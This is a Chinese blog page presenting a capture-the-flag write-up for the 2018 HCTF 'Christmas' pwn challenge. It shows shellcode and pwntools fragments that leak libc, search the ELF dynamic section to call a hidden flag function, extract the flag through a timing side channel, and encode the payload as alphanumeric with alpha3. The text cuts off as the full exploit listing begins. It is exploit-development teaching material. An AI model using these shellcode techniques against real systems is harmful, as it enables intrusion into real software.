@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>2018HCTF-Christmas | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="2018HCTF-Christmas">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018HCTF-Christmas">
+<meta property="og:url" content="http://yoursite.com/2019/03/02/2018HCTF-Christmas/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="2018HCTF-Christmas">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2018HCTF-Christmas/7722FF93-0A8F-40D2-9603-9D581088D890.png">
+<meta property="og:updated_time" content="2019-03-02T15:39:20.328Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018HCTF-Christmas">
+<meta name="twitter:description" content="2018HCTF-Christmas">
+<meta name="twitter:image" content="http://yoursite.com/2018HCTF-Christmas/7722FF93-0A8F-40D2-9603-9D581088D890.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#泄漏libc："><span class="toc-text">泄漏libc：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get段地址："><span class="toc-text">get段地址：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STRTAB段搜索："><span class="toc-text">STRTAB段搜索：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYMTAB段搜索："><span class="toc-text">SYMTAB段搜索：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#侧信道盲注flag："><span class="toc-text">侧信道盲注flag：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用："><span class="toc-text">利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encode-payload："><span class="toc-text">encode payload：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#待填坑："><span class="toc-text">待填坑：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-2018HCTF-Christmas" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">2018HCTF-Christmas</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.03.02</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>因为复现的过程中觉得这道题和我之前做的一个六字节<code>shellcode</code>的题目很相像，所以先打算复现它，但是在搞清楚这道题的思路的整个过程很是艰难，花了好大的劲才算基本吃透了这题。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  christmas checksec ./christmas </span><br><span class="line">[*] &apos;/home/parallels/Desktop/HCTF/christmas/christmas&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+<p>没开PIE。所以可以在此基础上泄漏libc了。</p>
+<p>整个程序就是mmap了两块相邻的堆。一块可执行，一块不可执行，在可执行的堆块上写<code>shellcode</code>，且只能为数字和字母。flag在<code>libflag.so</code>文件中。轮到执行我们所写的<code>shellcode</code>的时候寄存器和栈的情况是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">RAX  0x69d352aa000 ◂— mov    rsp, rdi /* 0x3148f08948fc8948 */</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x0</span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x401000 ◂— push   r15</span><br><span class="line"> RSP  0xd7061684800 ◂— 0x0</span><br><span class="line"> RIP  0x69d352aa02d ◂— xor    rbp, rbp /* 0x61ed3148 */</span><br><span class="line">─────────────[ DISASM ]────────────</span><br><span class="line">   0x69d352aa01e    xor    r11, r11</span><br><span class="line">   0x69d352aa021    xor    r12, r12</span><br><span class="line">   0x69d352aa024    xor    r13, r13</span><br><span class="line">   0x69d352aa027    xor    r14, r14</span><br><span class="line">   0x69d352aa02a    xor    r15, r15</span><br><span class="line"> ► 0x69d352aa02d    xor    rbp, rbp</span><br><span class="line">───────[ STACK ]─────────</span><br><span class="line">00:0000│ rsp  0xd7061684800 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">────────[ BACKTRACE ]───────</span><br><span class="line"> ► f 0      69d352aa02d</span><br><span class="line">   f 1                0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+<p>我们的思路是这样的：</p>
+<ol>
+<li>先泄漏拿到libc基地址和<code>libflag.so</code>的基地址。</li>
+<li>往前盲测，在<code>libflag.so</code>中搜索<code>Dynamic</code>段拿到<code>STRTAB</code>和<code>SYMTAB</code>段地址。</li>
+<li>通过<code>flag_yes_</code>字符串在<code>STRTAB</code>段中搜索，得到偏移。</li>
+<li>通过上面的偏移在<code>SYMTAB</code>段中搜索<code>flag_yes</code>的函数偏移。</li>
+<li><code>call flag_yes</code>运行flag函数。</li>
+<li>通过侧信道来盲注<code>flag</code>。</li>
+</ol>
+<p>一下一步步讲这些的过程的<code>shellcode</code>编写过程。编写的<code>shellcode</code>不能有<code>\x00</code>字符。</p>
+<h3 id="泄漏libc："><a href="#泄漏libc：" class="headerlink" title="泄漏libc："></a>泄漏libc：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asm(sc.mov(&apos;rax&apos;,0x602030))+\   --&gt;puts@got</span><br><span class="line">asm(&apos;mov rbx,[rax]&apos;)+\          --&gt;拿到真实函数地址</span><br><span class="line">asm(sc.mov(&apos;rcx&apos;,0x6f690))+\    </span><br><span class="line">asm(&apos;sub rbx,rcx&apos;)+\            --&gt;拿到libc基地址</span><br></pre></td></tr></table></figure>
+<h3 id="get段地址："><a href="#get段地址：" class="headerlink" title="get段地址："></a>get段地址：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">asm(sc.push(0x6FFFFEF5))+\      --&gt;DT_GNU_HASH处固定值，便于搜索</span><br><span class="line">asm(&apos;&apos;&apos;</span><br><span class="line">    start :</span><br><span class="line">        push 4</span><br><span class="line">        pop rcx</span><br><span class="line">        mov rdi,rbx</span><br><span class="line">        mov rsi,rsp</span><br><span class="line">        cld</span><br><span class="line">        repe cmpsb</span><br><span class="line">        jz do</span><br><span class="line">        sub rbx,1</span><br><span class="line">        jnz start</span><br><span class="line">    do :</span><br><span class="line">        add rbx,0x18</span><br><span class="line">        mov r10,[rbx]           --&gt;拿到DT_STRTAB地址</span><br><span class="line">        add rbx,0x10            </span><br><span class="line">        mov r11,[rbx]           --&gt;拿到DT_SYMTAB地址</span><br><span class="line">        sub rdi,0x1c</span><br><span class="line">        mov rcx,[rdi]</span><br><span class="line">        sub rbx,0x78</span><br><span class="line">        sub rbx,0x30</span><br><span class="line">        sub rbx,rcx</span><br><span class="line">        mov r12,rbx             --&gt;拿到libflag.so基地址</span><br><span class="line">    &apos;&apos;&apos;)</span><br></pre></td></tr></table></figure>
+<p>上面拿到的DT_STRTAB和DT_SYMTAB地址是真实地址（不是偏移地址）。具体的DYNAMIC段我们来看看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000601E08 stru_601E08     Elf64_Dyn &lt;1, 1&gt;        ; DATA XREF: LOAD:0000000000400130↑o</span><br><span class="line">LOAD:0000000000601E08                                         </span><br><span class="line">LOAD:0000000000601E08                                         ; DT_NEEDED libseccomp.so.2</span><br><span class="line">LOAD:0000000000601E18                 Elf64_Dyn &lt;1, 9Bh&gt;      ; DT_NEEDED libdl.so.2</span><br><span class="line">LOAD:0000000000601E28                 Elf64_Dyn &lt;1, 0B5h&gt;     ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:0000000000601E38                 Elf64_Dyn &lt;0Ch, 4009D8h&gt; ; DT_INIT</span><br><span class="line">LOAD:0000000000601E48                 Elf64_Dyn &lt;0Dh, 401074h&gt; ; DT_FINI</span><br><span class="line">LOAD:0000000000601E58                 Elf64_Dyn &lt;19h, 601DF0h&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:0000000000601E68                 Elf64_Dyn &lt;1Bh, 8&gt;      ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:0000000000601E78                 Elf64_Dyn &lt;1Ah, 601DF8h&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:0000000000601E88                 Elf64_Dyn &lt;1Ch, 8&gt;      ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:0000000000601E98                 Elf64_Dyn &lt;6FFFFEF5h, 400298h&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:0000000000601EA8                 Elf64_Dyn &lt;5, 4005B0h&gt;  ; DT_STRTAB</span><br><span class="line">LOAD:0000000000601EB8                 Elf64_Dyn &lt;6, 4002E0h&gt;  ; DT_SYMTAB</span><br><span class="line">LOAD:0000000000601EC8                 Elf64_Dyn &lt;0Ah, 180h&gt;   ; DT_STRSZ</span><br></pre></td></tr></table></figure>
+<p>上面的DT_FINI_ARRAY和DT_INIT_ARRAY的第二个值是偏移地址不是真实地址。所以可以用他们任意一个来得到基地址。具体的可以自行写一个调试看看。</p>
+<h3 id="STRTAB段搜索："><a href="#STRTAB段搜索：" class="headerlink" title="STRTAB段搜索："></a>STRTAB段搜索：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">asm(&apos;mov rbx,r10&apos;)+\                    --&gt;strtab段地址</span><br><span class="line">asm(sc.pushstr(&apos;flag_yes_&apos;))+\          --&gt;逐字节查找字符串</span><br><span class="line">asm(&apos;&apos;&apos;</span><br><span class="line">    start :</span><br><span class="line">        push 9</span><br><span class="line">        pop rcx</span><br><span class="line">        mov rdi,rbx</span><br><span class="line">        mov rsi,rsp</span><br><span class="line">        cld</span><br><span class="line">        repe cmpsb</span><br><span class="line">        jz do</span><br><span class="line">        add rbx,1</span><br><span class="line">        jnz start</span><br><span class="line">    do :</span><br><span class="line">        sub rbx,r10                     --&gt;拿到偏移</span><br><span class="line">    &apos;&apos;&apos;)+\</span><br><span class="line">asm(&apos;mov rax,rbx&apos;)+\</span><br></pre></td></tr></table></figure>
+<h3 id="SYMTAB段搜索："><a href="#SYMTAB段搜索：" class="headerlink" title="SYMTAB段搜索："></a>SYMTAB段搜索：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">asm(&apos;mov rbx,r11&apos;)+\                    --&gt;SYMTAB段地址</span><br><span class="line">asm(&apos;push rax&apos;)+\                       --&gt;逐字符查找上面拿到的偏移</span><br><span class="line">asm(&apos;&apos;&apos;</span><br><span class="line">    start :</span><br><span class="line">        push 3</span><br><span class="line">        pop rcx</span><br><span class="line">        mov rdi,rbx</span><br><span class="line">        mov rsi,rsp</span><br><span class="line">        cld</span><br><span class="line">        repe cmpsb</span><br><span class="line">        jz do</span><br><span class="line">        add rbx,1</span><br><span class="line">        jnz start</span><br><span class="line">    do :</span><br><span class="line">    &apos;&apos;&apos;)+\</span><br><span class="line">asm(&apos;mov rax,rbx&apos;)+\</span><br><span class="line">asm(&apos;add rax,0x8&apos;)+\</span><br><span class="line">asm(&apos;mov rbx,[rax]&apos;)+\                  --&gt;拿到flag_yes函数偏移地址</span><br><span class="line">asm(&apos;add rbx,r12&apos;)+\                    --&gt;得到真实地址</span><br><span class="line">asm(&apos;call rbx&apos;)</span><br></pre></td></tr></table></figure>
+<h3 id="侧信道盲注flag："><a href="#侧信道盲注flag：" class="headerlink" title="侧信道盲注flag："></a>侧信道盲注flag：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">asm(&apos;&apos;&apos;</span><br><span class="line">    add al,%d                           --&gt;call完函数返回一个字符串地址</span><br><span class="line">    xor rbx,rbx</span><br><span class="line">    xor rcx,rcx</span><br><span class="line">    mov bl,[rax]</span><br><span class="line">    add cl,%d                           --&gt;对比单个字符</span><br><span class="line">    cmp bl,cl</span><br><span class="line">    jz do                               --&gt;如果为0则进入死循环，即相等</span><br><span class="line">    xor rax,rax</span><br><span class="line">    mov al,60                           --&gt;syscall exit</span><br><span class="line">    syscall</span><br><span class="line"> do :</span><br><span class="line">    &apos;&apos;&apos;%(index,asc))+asm(sc.infloop())</span><br></pre></td></tr></table></figure>
+<p>因为程序只能用exit函数，所以无法打印出字符串，那么我们就换一种方式来输出字符串。flag的每个字符串我们都一个一个对比过去，如果一个对比相等则进入死循环，然后接下来对比第二个。</p>
+<h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3><p>当进入死循环的时候我们就好利用了，我们设置接收超时时间为2。当进入死循环时我们就可以判定超时，从而得到我们想要的字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;tell me how to find it??\n&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">start = time.time()</span><br><span class="line">p.can_recv(timeout=2)         --&gt;设置超时时间</span><br><span class="line">end = time.time()</span><br><span class="line">p.close()</span><br><span class="line">if end - start &gt; 2 :</span><br><span class="line">    #print asc</span><br><span class="line">    return True</span><br><span class="line">else :</span><br><span class="line">    #p.close()</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure>
+<h3 id="encode-payload："><a href="#encode-payload：" class="headerlink" title="encode payload："></a>encode payload：</h3><p>这里因为<code>shellcode</code>只能用数字和字母，所以我们需要加密一下<code>shellcode</code>，这里有一个工具叫<code>alpha3</code>，可以用它来突破。当然也可以自己手写加密（难度要求蛮高的，我太菜了）。不过不能直接在Linux中使用，需要适当的修改一下。</p>
+<p>我这里自己另写了一个小程序了解了一下他的编码过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  0x10bc79a9a030    push   rax</span><br><span class="line">  0x10bc79a9a031    push   0x36363630</span><br><span class="line">  0x10bc79a9a036    push   rsp</span><br><span class="line">  0x10bc79a9a037    pop    rcx</span><br><span class="line">  0x10bc79a9a038    xor    dword ptr [rcx], esi</span><br><span class="line">  0x10bc79a9a03a    xor    esi, dword ptr [rcx]</span><br><span class="line">  0x10bc79a9a03c    pop    rax</span><br><span class="line">  0x10bc79a9a03d    push   0x33333333</span><br><span class="line">  0x10bc79a9a042    xor    dword ptr [rcx], esi</span><br><span class="line">  0x10bc79a9a044    imul   esi, dword ptr [rcx], 0x33</span><br><span class="line">  0x10bc79a9a047    pop    rax</span><br><span class="line">  0x10bc79a9a048    push   0x69</span><br><span class="line">  0x10bc79a9a04a    push   rsi</span><br><span class="line">  0x10bc79a9a04b    xor    dword ptr [rcx], esi</span><br><span class="line">  0x10bc79a9a04d    movsxd rsi, dword ptr [rcx]</span><br><span class="line">  0x10bc79a9a050    pop    rdx</span><br><span class="line">  0x10bc79a9a051    pop    rax</span><br><span class="line">  0x10bc79a9a052    pop    rcx</span><br><span class="line">► 0x10bc79a9a053    xor    word ptr [rcx + rsi*2 + 0x49], dx</span><br></pre></td></tr></table></figure>
+<p>他首先先设置好基地址和各个基数，给后面的解码打上基础。在0x10bc79a9a053处第一次解码，我们先看看原来的内存上的shellcode：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0xa9a5331c000</span><br><span class="line">0xa9a5331c000:	0x3148f08948fc8948	0x48d23148c93148db</span><br><span class="line">0xa9a5331c010:	0xc0314df63148ff31	0x314dd2314dc9314d</span><br><span class="line">0xa9a5331c020:	0x4ded314de4314ddb	0xed3148ff314df631</span><br><span class="line">0xa9a5331c030:	0x3636363068503234	0x6858313331315954</span><br><span class="line">0xa9a5331c040:	0x316b313133333333	0x48313156696a5833</span><br><span class="line">0xa9a5331c050:	0x54316659585a3163	0x71446b3966484971</span><br><span class="line">0xa9a5331c060:	0x4430587144323057	0x3047324d33754831</span><br><span class="line">0xa9a5331c070:	0x00000030304f3737	0x0000000000000000</span><br><span class="line">pwndbg&gt; p $rcx + $rsi*2 + 0x49</span><br><span class="line">$2 = 0xa9a5331c05b</span><br></pre></td></tr></table></figure>
+<p>也就是他把0x3966异或了一下，即将接下来要执行的shellcode解码了。解码后的情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xa9a5331c050:	0x54316659585a3163	0x71446bc6ff484971</span><br></pre></td></tr></table></figure>
+<p>0x3966变成了0xc6ff，看看汇编情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; disasm(&apos;\x48\xff\xc6&apos;)</span><br><span class="line">&apos;   0:   48 ff c6                inc    rsi&apos;</span><br></pre></td></tr></table></figure>
+<p>往后看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0xa9a5331c055    xor    word ptr [rcx + rsi*2 + 0x49], dx</span><br><span class="line">  0xa9a5331c05a    inc    rsi</span><br><span class="line">  0xa9a5331c05d    imul   eax, dword ptr [rcx + rsi*2 + 0x57], 0x30</span><br><span class="line">  0xa9a5331c062    xor    al, byte ptr [rcx + rsi*2 + 0x58]</span><br><span class="line">  0xa9a5331c066    xor    byte ptr [rcx + rsi + 0x48], al</span><br><span class="line">► 0xa9a5331c06a  ✔ jne    0xa9a5331c05a</span><br></pre></td></tr></table></figure>
+<p>这里其实就是循环解码了，逐个解码真正的最重要的shellcode的部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xa9a5331c060:	0x4430587144323057	0x3047324d33754831</span><br><span class="line">                                               |--&gt;从0x33开始解码</span><br><span class="line">0xa9a5331c070:	0x00000030304f3737	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>所有解码完成后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0xa9a5331c060:	0x4430587144323057	0x0058056aee754831</span><br><span class="line">                                       |--&gt;shellcode终点，停止执行</span><br><span class="line">0xa9a5331c070:	0x00000030304f3737	0x0000000000000000</span><br><span class="line">                         |-------|</span><br><span class="line">                             |</span><br><span class="line">                             |-----&gt;这些相当于只是辅助循环解码的字符，总共十个，</span><br><span class="line">                                    （前面还有五个）两两辅助一个解码，最终五个</span><br><span class="line">                                     shellcode。</span><br></pre></td></tr></table></figure>
+<p>解码完成后的shellcode：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0xa9a5331c06c    push   5</span><br><span class="line">  0xa9a5331c06e    pop    rax</span><br></pre></td></tr></table></figure>
+<p>我所写的则是<code>mov rax,0x5</code>。</p>
+<p>那么我们现在就可以来修改一下了，当我们直接使用<code>alpha3</code>的时候程序会崩溃在这里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x10bc79a9a050    pop    rdx</span><br><span class="line">  0x10bc79a9a051    pop    rax</span><br><span class="line">  0x10bc79a9a052    pop    rcx</span><br><span class="line">  0x10bc79a9a053    xor    word ptr [rcx + rsi*2 + 0x49], dx</span><br><span class="line">► 0x10bc79a9a058    cmp    word ptr [rbx + 0x44], bp</span><br></pre></td></tr></table></figure>
+<p>因为这里的$rbx + 0x44为0。所以崩溃，仔细看可以发现这里和我们上面所跟踪的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xa9a5331c055    xor    word ptr [rcx + rsi*2 + 0x49], dx</span><br><span class="line">0xa9a5331c05a    inc    rsi</span><br></pre></td></tr></table></figure>
+<p>这里一样，只是崩溃的汇编代码没有正确执行到<code>inc rsi</code>。所以我们就明白具体需要修改哪里了。这里只要加上42(xor rax, ‘2’)，修正base addr，就可以用了。</p>
+<p>成功跑出flag：</p>
+<p><img src="/2018HCTF-Christmas/7722FF93-0A8F-40D2-9603-9D581088D890.png" alt="7722FF93-0A8F-40D2-9603-9D581088D890"></p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 